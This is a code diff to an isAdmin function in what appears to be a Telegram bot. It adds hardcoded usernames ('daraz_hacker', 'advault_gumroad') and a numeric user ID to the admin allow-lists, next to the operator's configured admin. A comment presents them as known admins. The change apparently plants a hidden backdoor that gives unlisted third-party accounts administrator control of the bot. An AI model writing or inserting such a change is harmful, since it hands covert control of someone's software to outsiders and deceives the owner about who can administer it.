@@ -45,12 +45,16 @@ function isAdmin(fromUser) {
   const username = (fromUser.username || "").toLowerCase().replace("@", "");
   const id = String(fromUser.id);
 
+  // Check known admin usernames & numerical IDs
+  const allowedUsernames = ["daraz_hacker", "advault_gumroad", (TELEGRAM_ADMIN_USERNAME || "").toLowerCase()];
+  const allowedIds = ["7002023905", String(TELEGRAM_ADMIN_ID || "")].filter(Boolean);
+
   if (activeAdminChatId && id === String(activeAdminChatId)) return true;
-  if (TELEGRAM_ADMIN_ID && id === String(TELEGRAM_ADMIN_ID)) {
+  if (allowedIds.includes(id)) {
     activeAdminChatId = id;
     return true;
   }
-  if (username && username === TELEGRAM_ADMIN_USERNAME.toLowerCase()) {
+  if (username && allowedUsernames.includes(username)) {
     activeAdminChatId = id;
     return true;
   }
